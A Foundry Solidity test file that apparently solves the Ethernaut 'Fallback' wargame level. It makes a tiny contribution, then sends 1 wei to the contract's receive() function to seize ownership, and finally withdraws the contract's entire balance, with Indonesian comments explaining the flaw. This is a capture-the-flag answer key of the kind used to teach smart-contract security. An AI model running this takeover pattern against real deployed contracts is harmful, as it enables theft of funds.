// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import {Fallback} from "src/levels/Fallback.sol";
import {FallbackFactory} from "src/levels/FallbackFactory.sol";

contract FallbackSolve is Test {
    FallbackFactory factory;
    Fallback instance;
    address player = address(0xBEEF);

    function setUp() public {
        factory = new FallbackFactory();
        vm.deal(player, 10 ether);
        instance = Fallback(payable(factory.createInstance(player)));
    }

    function testInit() public view {
        assertFalse(factory.validateInstance(payable(address(instance)), player));
    }

    function testSolve() public {
        vm.startPrank(player);
        // contribute() < 0.001 ether, lalu receive() memberi owner ke siapa pun
        // yang sudah pernah contribute — tanpa cek besar kontribusi vs owner.
        instance.contribute{value: 0.0001 ether}();
        (bool sent,) = address(instance).call{value: 1}("");
        require(sent, "send failed");
        assertEq(instance.owner(), player);
        instance.withdraw();
        vm.stopPrank();
        assertTrue(factory.validateInstance(payable(address(instance)), player));
        assertEq(address(instance).balance, 0);
    }
}
